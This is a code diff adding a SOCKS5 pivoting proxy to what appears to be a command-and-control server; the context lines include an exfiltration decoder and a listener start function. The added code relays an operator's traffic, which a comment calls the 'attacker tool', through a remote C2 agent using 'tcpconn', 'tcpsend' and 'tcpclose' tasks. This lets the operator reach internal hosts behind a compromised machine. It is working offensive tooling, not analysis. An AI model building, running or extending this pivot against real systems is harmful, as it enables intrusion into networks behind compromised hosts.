@@ -855,6 +855,158 @@ def _decode_exfil(body: bytes) -> str:
         return body.decode("utf-8", errors="replace")
 
 
+# ── SOCKS5 proxy server over C2 agent TCP relay ──────────────────────────────
+import socket as _socket
+import struct as _struct
+
+_ACTIVE_SOCKS5: dict = {}   # session_id → {"thread": Thread, "server": TCPServer, "port": int}
+_SOCKS5_LOCK   = threading.Lock()
+
+
+def _c2_task_sync(session_id: str, command: str, timeout: float = 8.0) -> str | None:
+    """Push task to agent and block until result arrives (or timeout)."""
+    tid = _c2_push_task(session_id, command)
+    if not tid:
+        return None
+    deadline = time.time() + timeout
+    while time.time() < deadline:
+        result = _c2_get_result(session_id, tid)
+        if result is not None:
+            return result
+        time.sleep(0.15)
+    return None
+
+
+class _Socks5Handler(socketserver.BaseRequestHandler):
+    """One thread per SOCKS5 client connection. Routes via C2 agent TCP relay."""
+
+    session_id: str = ""
+
+    def handle(self):
+        sid = self.session_id
+        conn = self.request
+        conn.settimeout(10)
+        try:
+            # --- SOCKS5 greeting ---
+            hdr = conn.recv(2)
+            if len(hdr) < 2 or hdr[0] != 5:
+                return
+            nmethods = hdr[1]
+            conn.recv(nmethods)
+            conn.sendall(b"\x05\x00")  # no auth
+
+            # --- SOCKS5 request ---
+            req = conn.recv(4)
+            if len(req) < 4 or req[0] != 5 or req[1] != 1:  # only CONNECT
+                conn.sendall(b"\x05\x07\x00\x01" + b"\x00"*6)
+                return
+            atype = req[3]
+            if atype == 1:    # IPv4
+                raw = conn.recv(4)
+                host = ".".join(str(b) for b in raw)
+            elif atype == 3:  # domain
+                ln = conn.recv(1)[0]
+                host = conn.recv(ln).decode("utf-8", errors="replace")
+            elif atype == 4:  # IPv6
+                raw = conn.recv(16)
+                host = _socket.inet_ntop(_socket.AF_INET6, raw)
+            else:
+                conn.sendall(b"\x05\x08\x00\x01" + b"\x00"*6)
+                return
+            port_raw = conn.recv(2)
+            port = _struct.unpack("!H", port_raw)[0]
+
+            # --- Ask agent to connect ---
+            result = _c2_task_sync(sid, f"tcpconn {host} {port}", timeout=10.0)
+            if not result or "connected id=" not in result:
+                conn.sendall(b"\x05\x04\x00\x01" + b"\x00"*6)
+                return
+            relay_id = result.split("id=")[1].strip()
+            conn.sendall(b"\x05\x00\x00\x01" + b"\x00"*6)
+
+            # --- Relay loop ---
+            conn.settimeout(0.5)
+            while True:
+                # Receive from SOCKS5 client (attacker tool)
+                try:
+                    data = conn.recv(32768)
+                except _socket.timeout:
+                    data = b""
+                except Exception:
+                    break
+
+                import base64 as _b64
+                b64_data = _b64.b64encode(data).decode() if data else ""
+                # Send to agent + receive response
+                resp = _c2_task_sync(sid, f"tcpsend {relay_id} {b64_data}", timeout=5.0)
+                if resp is None:
+                    break  # agent dead or timeout
+                if resp.strip():
+                    try:
+                        decoded = _b64.b64decode(resp.strip())
+                        if decoded:
+                            conn.sendall(decoded)
+                    except Exception:
+                        pass
+                elif not data:
+                    # Nothing from client or agent — idle poll to detect close
+                    time.sleep(0.1)
+                    continue
+
+        except Exception:
+            pass
+        finally:
+            try:
+                _c2_task_sync(sid, f"tcpclose {relay_id if 'relay_id' in dir() else '0'}", timeout=3.0)
+            except Exception:
+                pass
+
+
+def socks5_start(session_id: str, port: int) -> dict:
+    """Start a SOCKS5 proxy on 127.0.0.1:<port> routing through session_id."""
+    with _SOCKS5_LOCK:
+        if session_id in _ACTIVE_SOCKS5:
+            return {"error": "already running", "port": _ACTIVE_SOCKS5[session_id]["port"]}
+        if session_id not in _C2_SESSIONS:
+            return {"error": "session not found"}
+
+    # Bind before spawning thread so we can report port-in-use immediately
+    try:
+        class _Srv(socketserver.ThreadingTCPServer):
+            allow_reuse_address = True
+            daemon_threads      = True
+            def finish_request(self, request, client_address):
+                handler = _Socks5Handler(request, client_address, self)
+                handler.session_id = _Socks5Handler.session_id
+        _Socks5Handler.session_id = session_id
+        srv = _Srv(("127.0.0.1", port), _Socks5Handler)
+    except OSError as e:
+        return {"error": str(e)}
+
+    def _run():
+        srv.serve_forever()
+
+    t = threading.Thread(target=_run, daemon=True, name=f"socks5-{session_id[:8]}")
+    t.start()
+    with _SOCKS5_LOCK:
+        _ACTIVE_SOCKS5[session_id] = {"thread": t, "server": srv, "port": port}
+    return {"ok": True, "port": port, "session": session_id}
+
+
+def socks5_stop(session_id: str) -> dict:
+    with _SOCKS5_LOCK:
+        entry = _ACTIVE_SOCKS5.pop(session_id, None)
+    if not entry:
+        return {"error": "not running"}
+    entry["server"].shutdown()
+    return {"ok": True}
+
+
+def socks5_status() -> dict:
+    with _SOCKS5_LOCK:
+        return {sid: {"port": e["port"]} for sid, e in _ACTIVE_SOCKS5.items()}
+
+
 def start_server(
     workspace:       str,
     lhost:           str = "0.0.0.0",
